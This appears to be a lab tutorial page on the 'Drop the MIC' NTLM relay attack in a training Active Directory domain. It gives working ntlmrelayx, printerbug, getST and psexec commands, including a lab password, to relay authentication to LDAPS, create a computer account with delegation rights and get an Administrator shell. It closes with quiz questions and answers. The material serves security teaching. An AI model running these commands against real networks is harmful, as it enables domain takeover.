#Drop the MIC attack

This attack targets the NTLM protocol. It also relays authentication from a legitimate client to a legitimate server, but this time, the messages no longer target the SMB service, but the LDAPS service. LDAPS can be used to alter the AD database and doesn't enforce singing by default on DCs, contrary to the SMB service. The attacker hijacks NTLM authentication messages being sent to access an SMB service, and alters them to access LDAPS instead. In order to do so, they must remove the Message Integrity Code (MIC) from NTLM messages. Hence the attack's name.


This attack also makes use of two different terminals, just like the NTLM relay attack.
This attack will relay authentication from the MEMBER machine to the CAPTAIN machine, and use it to create a new computer account, as well as grant this new computer account RBCD privileges to MEMBER, which means that the new computer account can impersonate any user to access any service provided by the MEMBER machine, essentially compromising it.

First, in one terminal run:
```
ntlmrelayx.py -t ldaps://captain.north.altair.local --remove-mic --add-computer removemiccomputer --delegate-access 
```

This script will relay NTLM messages that are originally meant for an SMB service to the LDAPS service from the MEMBER machine to the CAPTAIN machine, and automatically create the new computer account and grant it RBCD privileges in MEMBER.

In a second terminal, run:
```
#in the krbrelayx dir
python3 printerbug.py NORTH/skyler.white:Password123@192.168.122.5 192.168.122.2 
```
This script uses the printer bug in order to coerce authentication from the MEMBER machine to the attacker's machine, allowing the attacker to relay MEMBER's NTLM messages to LDAPS in the DC.

Take note of the newly created computer account on the ntlmrelayx script output. You can now use this account to impersonate the Administrator to a MEMBER machine service, as per RBCD normal behavior:

```
getST.py -dc-ip 192.168.122.10 -impersonate Administrator -spn cifs/member.north.altair.local north/removemiccomputer\$:'<passwordfromntlmscript>'
#set the KRB5CCNAME environment variable to the new ticket
export KRB5CCNAME=/your/current/directory/Administrator.ccache
#now you can access the SMB service as the Administrator user on MEMBER
psexec.py -k -no-pass member.north.altair.local
whoami
```

!!! question
    What's the purpose of targetting the LDAPS service instead of the SMB service in this attack?
??? success "Answer"
    The LDAPS does not enforce signing by default, in contrary to SMB. Removing the MIC while using a service that enforces signing won't work. That's why the LDAPS service is targetted in this attack.
!!! question
    Why can we configure the newly computer account with RBCD privileges against the MEMBER machine?
??? success "Answer"
    We can configure RBCD in this manner since we're using an authenticated MEMBER connection, which can configure RBCD related to itself (Resource-Based Constrained Delegation).